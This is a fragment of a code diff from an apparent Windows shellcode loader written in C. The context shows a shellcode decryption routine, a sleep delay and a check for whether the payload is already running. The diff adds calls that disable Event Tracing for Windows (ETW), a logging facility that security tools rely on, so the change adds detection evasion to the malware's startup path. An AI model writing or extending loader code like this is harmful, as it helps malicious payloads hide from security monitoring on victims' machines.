@@ -101,6 +101,8 @@ void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 
 
 void test() {
+	initAllFunc();
+	disableETW();
 	custom_sleep(500); // sleep 0.5s
 }
 
@@ -110,7 +112,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 // int main() {
 	test();
 	initAllFunc();
-
+	if (DisableETW) {
+		disableETW();
+	}
 	if (EnableMultiplePayloadControl) {
 		if (isPayloadRunning()) {
 			return 0;
